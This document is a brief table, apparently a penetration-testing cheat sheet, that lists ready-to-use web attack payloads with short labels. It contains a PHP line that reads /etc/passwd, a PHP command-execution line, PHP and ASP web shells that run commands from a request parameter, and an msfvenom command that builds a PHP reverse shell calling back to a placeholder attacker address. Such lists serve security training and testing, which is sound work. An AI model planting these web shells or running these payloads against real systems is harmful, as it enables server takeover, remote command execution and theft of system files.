|                                                                                |                             |
| ------------------------------------------------------------------------------ | --------------------------- |
| `<?php echo file_get_contents('/etc/passwd'); ?>`                              | Basic PHP File Read         |
| `<?php system('hostname'); ?>`                                                 | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>`                                           | Basic PHP Web Shell         |
| `<% eval request('cmd') %>`                                                    | Basic ASP Web Shell         |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell  |
